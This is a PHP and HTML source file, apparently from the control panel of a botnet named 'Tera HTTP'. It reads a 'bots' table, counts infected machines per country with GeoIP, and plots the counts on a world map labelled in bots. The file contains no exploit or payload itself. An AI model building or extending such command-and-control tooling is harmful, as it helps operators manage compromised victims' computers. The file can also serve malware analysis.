<?php
include("../inc/botstats.php");
include '../inc/geo/geoip.inc';
$gi = geoip_open("../inc/geo/GeoIP.dat", "");

$csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt ");
$rows = array();
$rows2 = array();
 while ($c = $csel->fetch())
									{
                    $top2 = geoip_country_code_by_id($gi, $c[0]);
                    $top = number_format($c[1]);
									  $uncap = strtolower($top2);
                   
                    $rows[] = $uncap;
                    $rows2[] = $top;
                    
									
  }

$c = array_combine($rows, $rows2);
$final = json_encode($c);


?>
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <title>Tera HTTP</title>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">

    <link href="../dist/jqvmap.css" media="screen" rel="stylesheet" type="text/css"/>

    <script type="text/javascript" src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="../js/jquery.vmap.js"></script>
    <script type="text/javascript" src="../js/jquery.vmap.world.js" charset="utf-8"></script>
    <script type="text/javascript" src="../js/jquery.vmap.sampledata.js"></script>
    <script type="text/javascript">
      var gdpData = <?php echo($final);?>;
    </script>
    <script>
      
      jQuery(document).ready(function () {
        jQuery('#vmap').vectorMap({
          map: 'world_en',
          backgroundColor: '#333333',
          color: '#ffffff',
          hoverOpacity: 0.7,
          selectedColor: '#666666',
          enableZoom: true,
          showTooltip: true,
          scaleColors: ['#C8EEFF', '#006491'],
          values: gdpData,
          normalizeFunction: 'polynomial',
          onLabelShow: function (event, label, code) {
    if(gdpData[code] > 0)
        label.append(': '+gdpData[code]+' Bots'); 
}
                                  
        });
      });
    </script>
  </head>
  <body>
    
    <div id="vmap" style="width: 600px; height: 400px;"></div>
  </body>
</html>

